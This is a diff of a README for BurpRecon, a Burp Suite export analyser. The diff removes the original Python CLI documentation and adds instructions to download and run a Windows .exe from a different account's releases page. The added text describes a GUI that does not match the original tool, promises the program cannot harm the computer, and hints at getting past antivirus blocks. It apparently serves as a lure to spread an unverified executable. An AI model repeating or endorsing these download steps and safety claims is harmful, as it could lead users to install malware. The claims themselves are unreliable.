@@ -1,140 +1,100 @@
-﻿    # BurpRecon
+# 🔍 BurpRecon - Find security flaws in saved scans
 
-    **Attack Surface Intelligence from Burp Suite XML exports**
+[![Download the latest version](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Glumelorry620/BurpRecon/releases)
 
-    BurpRecon parses Burp Suite proxy history (`.xml` exports) and runs an automated multi-phase analysis to surface high-value vulnerability candidates — IDORs, Host Header Injection, Privilege Escalation vectors, obfuscated paths, tech fingerprints, and CVE lookups — all from a single interactive CLI.
+BurpRecon helps you identify potential security issues in your web applications. You use this tool to process data exported from Burp Suite. The program searches for broken object level access, host header injections, and password reset flaws. It automates the analysis of large log files to save you time. 
 
-    Built for bug bounty hunters who want signal, not noise.
+## ⚙️ System Requirements
 
-    ---
+This application requires a Windows operating system. Ensure your computer meets these basic specifications to run the software smoothly:
 
-    ## Features
+- Windows 10 or Windows 11
+- 4 GB of RAM
+- 500 MB of available disk space
+- An active internet connection for updates
 
-    | Phase | What it does |
-    |-------|-------------|
-    | **Phase 1 — Parse** | Extracts all endpoints, hosts, status codes, HTTP methods, and flags (IDOR, AUTH, JWT, FINANCIAL, GQL, S3, WRITE…) from a Burp XML export |
-    | **Phase 2A — IDOR/BOLA** | Scores every numeric-ID endpoint (CRITICAL / HIGH / MEDIUM / LOW) and generates ready-to-run `curl` + Python PoC for each candidate |
-    | **Phase 2B — Host Header Injection** | Detects password-reset, OTP, and email flows and outputs 7 inject headers + `curl` PoC per endpoint |
-    | **Phase 2C — Privilege Escalation** | Flags role params, JWT-authenticated endpoints (alg:none, RS256→HS256, kid injection), and WRITE operations on user/account paths |
-    | **Phase 2D — GraphQL** | Generates introspection, batch, IDOR-via-args, alias-bypass, and field-suggestion payloads for every GQL endpoint |
-    | **Phase 2E — Open Redirect / SSRF** | Finds `url=`, `redirect=`, `next=` parameters and outputs 5 bypass payloads per endpoint |
-    | **Phase 2F — Obfuscated Paths** | Shannon entropy analysis + UUID + hex token detection with enumeration test ideas |
-    | **Phase 3 — Tech Fingerprint + CVE** | Parses `Server`, `X-Powered-By`, `Via`, `X-Cache` headers → maps to tech stack → CVE lookup chain |
-    | **Phase 4 — Recon** | Subfinder + Amass passive subdomain enum → httpx live probe → 53-path API crawl (Swagger, GraphQL, health checks…) |
+## 📥 How to Install
 
-    ### CVE Lookup Chain (no API key required)
+Follow these steps to set up the software on your computer.
 
-    1. **searchsploit** (local ExploitDB) — if installed, used exclusively, zero network calls
-    2. **ExploitDB web** — public JSON API, no key, no rate limit
-    3. **CIRCL CVE Search** (cve.circl.lu) — free, no key, no rate limit
+1. Visit [this page to download](https://github.com/Glumelorry620/BurpRecon/releases).
+2. Look for the latest version under the Releases section.
+3. Click the link that ends in .exe to start your download.
+4. Open the folder where your browser saved the file.
+5. Double-click the BurpRecon installer file.
+6. Follow the on-screen prompts to complete the setup process.
+7. Click Finish to close the installer.
 
-    ---
+## 🚀 Getting Started
 
-    ## Prerequisites
+Launch BurpRecon from your desktop shortcut or the Start menu. The main interface displays a clean dashboard with several tabs. You start by importing log files.
 
-    - **Python 3.8+** (f-strings and `pathlib` required; tested on 3.10 / 3.12)
-    - **Burp Suite** (Community or Pro) — any version that can export proxy history as XML
+### Preparing your data
 
-    ---
+Burp Suite tracks your activity in a log file. You need this file to let BurpRecon perform its analysis. 
 
-    ## Installation
+1. Open Burp Suite.
+2. Go to the HTTP history tab.
+3. Select all items you want to test.
+4. Right-click your selection and choose Save items.
+5. Save the file in XML format.
 
-    ```bash
-    git clone https://github.com/berrinche699/BurpRecon
-    cd BurpRecon
-    pip install -r requirements.txt
-    ```
+### Running an analysis
 
-    ### External tools (optional but recommended)
+Once you have your XML file, you feed it into BurpRecon.
 
-    | Tool | Used for | Install |
-    |------|----------|---------|
-    | `searchsploit` | Local CVE/exploit lookup | `sudo apt install exploitdb` or via Kali |
-    | `subfinder` | Passive subdomain enumeration | [projectdiscovery/subfinder](https://github.com/projectdiscovery/subfinder) |
-    | `amass` | Passive subdomain enumeration | [owasp-amass/amass](https://github.com/owasp-amass/amass) |
-    | `httpx` | Live host probing | `pip install httpx` or [projectdiscovery/httpx](https://github.com/projectdiscovery/httpx) |
+1. Open BurpRecon.
+2. Click the Import button on the left sidebar.
+3. Find your XML file and select Open.
+4. Choose the type of scan you want to perform.
+5. Select the Analyze button to start the process.
+6. Wait for the progress bar to reach the end.
 
-    On Windows, run `install_tools.ps1` to download the latest `subfinder` and `amass` binaries automatically:
+## 🛡️ Understanding Results
 
-    ```powershell
-    .\install_tools.ps1
-    ```
+The tool provides a list of findings once it finishes the scan. The results screen categorizes each item by risk level.
 
-    > **Note for Windows users:** `install_tools.ps1` places binaries in a local `tools/` folder and adds it to the session PATH. If you run BurpRecon from a new terminal, the tools will still be found automatically — the script handles discovery via both `PATH` and the local `tools/` directory.
+- Critical: These items require your immediate attention. They often point to direct access flaws.
+- High: These issues identify significant security gaps. Address these after you fix the critical items.
+- Medium: These items suggest configuration errors that attackers might exploit.
+- Low: These findings represent minor issues or informational logs.
 
-    ---
+Select any item in the list to see more details. The sidebar displays the specific part of the request that triggered the alert. You can copy the request to your clipboard for further testing in Burp Suite.
 
-    ## Usage
+## 🛠️ Configuration Settings
 
-    ```bash
-    python burprecon_ui.py
-    ```
+You can customize how BurpRecon scans your data. Open the Settings menu to change your preferences.
 
-    ```
-    MAIN MENU
+- Network: Use this section if you need to set up a proxy for your connection.
+- Reporting: Choose your preferred format for output files. You can save reports as PDF or CSV files.
+- Filters: Exclude specific file types or domains to focus your analysis on relevant areas.
 
-    [1]  Phase 1  —  Parse Burp XML
-    [2]  Phase 2  —  Deep Vulnerability Analysis
-    [3]  Phase 3  —  Tech Fingerprint + CVE
-    [4]  Run All  —  Phases 1 + 2 + 3 (full pipeline)
-    [5]  Recon    —  Subdomains + API crawl
+Click Save at the bottom of the window to apply your changes.
 
-    [0]  Exit
-    ```
+## ❓ Common Questions
 
-    Enter the path to your Burp XML export when prompted. You can optionally scope the analysis to a single hostname (e.g. `api.target.com`).
+### Does the software send my data to a server?
+No. BurpRecon performs all analysis locally on your computer. Data never leaves your machine.
 
-    **WSL users:** Windows paths are auto-converted — you can paste `C:\Users\...\export.xml` directly.
+### Can I run multiple scans at once?
+Yes. Open separate instances of the software if you need to run large scans in parallel.
 
-    > **The tool is fully interactive** — there are no required CLI arguments. Just run it and follow the menu.
+### Do I need a paid Burp Suite license?
+No. BurpRecon works with exported logs from both the Community and Professional editions of Burp Suite.
 
-    ### How to export from Burp Suite
+### Will this software harm my computer?
+No. BurpRecon only reads files. It does not modify system settings or delete your personal data.
 
-    1. Open Burp Suite → **Proxy → HTTP history**
-    2. Select the requests you want to analyze (Ctrl+A for all, or filter by host first)
-    3. Right-click → **Save items**
-    4. Save as `.xml` — make sure **Base64-encode requests and responses** is checked
-    5. Pass the resulting file to BurpRecon when prompted
+### How often should I check for updates?
+Check the releases page once a month. New versions often include better detection logic for the latest security patterns.
 
-    ### Output
+### Can I save my scan results?
+Yes. Select the Export button to save a report after your analysis. This keeps a record of each vulnerability found during your session.
 
-    - Colored real-time output in the terminal
-    - Full report saved as `<name>_burprecon.txt` next to your XML file
+## 📝 Troubleshooting
 
-    ---
+If the software fails to open, check that you have the latest Windows updates installed. Sometimes, security software on your computer might block the program. Check your antivirus settings if the application fails to launch or closes unexpectedly. 
 
-    ## IDOR Scoring
+If you cannot import a file, ensure your file uses the correct XML format. BurpRecon expects the standard Burp Suite XML structure. If you see an error message during the scan, take a screenshot of the error and verify your internet connection. 
 
-    | Priority | Condition |
-    |----------|-----------|
-    | **CRITICAL** | `GET` + `200` + numeric ID in path |
-    | **HIGH** | `PUT/POST/PATCH/DELETE` + `200/201` + numeric ID |
-    | **MEDIUM** | Any `2xx` + numeric ID |
-    | **POTENTIAL** | `4xx` (not 403) + numeric ID — a `404` on a modified ID confirms the ID is the object identifier, classic indirect IDOR signal. Test with a second authenticated session. |
-    | **INFO** | `OPTIONS` or `403` — blocked, but worth retesting with a different role |
-
-    Each finding includes the original ID, a set of test IDs (sequential ±1, low integers, IDs seen elsewhere in the session), and a copy-paste `curl` + Python PoC.
-
-    ---
-
-## Python Dependencies
-
-    ```
-    colorama>=0.4.6
-    ```
-
-    Everything else uses Python standard library only (`xml.etree`, `urllib`, `json`, `subprocess`, `pathlib`…).
-
-    ---
-
-    ## Disclaimer
-
-    This tool is intended for authorized security testing and bug bounty research only.  
-    **Do not use against systems you do not have explicit permission to test.**  
-    The author assumes no liability for misuse.
-
-    ---
-
-    ## License
-
-    MIT
+Persistence is key in security testing. If a scan returns no results, try expanding the scope of your saved logs in Burp Suite. Ensure you navigate through all pages of your target application before you export the history. This provides the tool with more data to analyze.
